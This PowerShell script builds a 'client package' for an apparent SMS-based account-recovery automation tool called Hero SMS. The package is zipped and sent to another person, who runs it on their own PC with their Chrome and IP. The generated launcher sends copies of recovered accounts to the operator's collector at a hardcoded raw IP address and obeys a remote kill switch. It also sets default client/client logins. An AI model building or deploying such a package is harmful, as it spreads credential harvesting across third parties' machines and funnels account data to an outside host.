# =====================================================================
#  Build a CLIENT package to hand to someone.
#  The client runs it on THEIR OWN PC: their Chrome, their IP, their
#  machine. It has NO owner/admin panel, uploads a copy of recovered
#  accounts to your collector, and obeys your remote disable switch.
#
#  FIRST create the client in your dashboard's "Clients" panel to get
#  its KEY, then run this to build the package.
# =====================================================================
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path

# Default collector URL (your VPS). Press Enter to accept, or type another.
$DEFAULT_COLLECTOR = "http://139.59.120.16:5000/api/collect"

Write-Host "=================================================="
Write-Host "  Build a client package"
Write-Host "=================================================="
Write-Host ""
Write-Host "Step 1 (do this first): in your dashboard -> Clients -> create the"
Write-Host "client and copy its KEY. Then fill in below."
Write-Host ""

$name = Read-Host "Client name (must match the one you created, e.g. RAIHAN)"
if ($name -notmatch '^[A-Za-z0-9_-]{1,30}$') { Write-Host "Bad name. Aborting."; exit 1 }

$key = Read-Host "Client KEY (from the Clients panel)"
if ([string]::IsNullOrWhiteSpace($key)) { Write-Host "No key. Aborting."; exit 1 }

$collector = Read-Host "Collector URL [Enter = $DEFAULT_COLLECTOR]"
if ([string]::IsNullOrWhiteSpace($collector)) { $collector = $DEFAULT_COLLECTOR }

$loginUser = Read-Host "Client's login username (default: client)"
if ([string]::IsNullOrWhiteSpace($loginUser)) { $loginUser = "client" }
$loginPass = Read-Host "Client's login password (default: client)"
if ([string]::IsNullOrWhiteSpace($loginPass)) { $loginPass = "client" }

# Build the package folder
$dest = Join-Path $root "client_builds\$name"
New-Item -ItemType Directory -Force -Path $dest | Out-Null
foreach ($f in @('app.py','hero_sms_automation.py','clean_unused_profiles.py','analyze_recovery_times.py','requirements.txt')) {
    $src = Join-Path $root $f
    if (Test-Path $src) { Copy-Item $src -Destination $dest -Force }
}

# Client launcher (installs deps, sets client env, runs locally, opens browser)
$startBat = @"
@echo off
title Hero SMS - $name
cd /d "%~dp0"
echo Setting up (first run installs Python packages)...
python --version >nul 2>&1 || (echo Please install Python 3.10+ from python.org, then re-run. & pause & exit /b)
python -m pip install -r requirements.txt
python -m playwright install chromium
set HERO_CLIENT_ID=$name
set HERO_CLIENT_KEY=$key
set HERO_COLLECTOR_URL=$collector
set HERO_CLIENT_LOGIN_USER=$loginUser
set HERO_CLIENT_LOGIN_PASS=$loginPass
set HERO_HOST=127.0.0.1
echo Opening dashboard at http://127.0.0.1:5000  (login: $loginUser / $loginPass)
start "" http://127.0.0.1:5000
python app.py 5000
pause
"@
Set-Content -Path (Join-Path $dest 'START.bat') -Value $startBat -Encoding ASCII

Write-Host ""
Write-Host "Done. Client package built:"
Write-Host "  $dest"
Write-Host ""
Write-Host "  Client login : $loginUser / $loginPass"
Write-Host "  Uploads to   : $collector"
Write-Host ""
Write-Host "Next: ZIP the folder '$dest' and send it to $name."
Write-Host "They unzip and double-click START.bat. It runs on THEIR PC using"
Write-Host "their Chrome + IP; a copy of their recoveries comes to your collector."
Write-Host "Disable them anytime from the Clients panel."
Write-Host ""
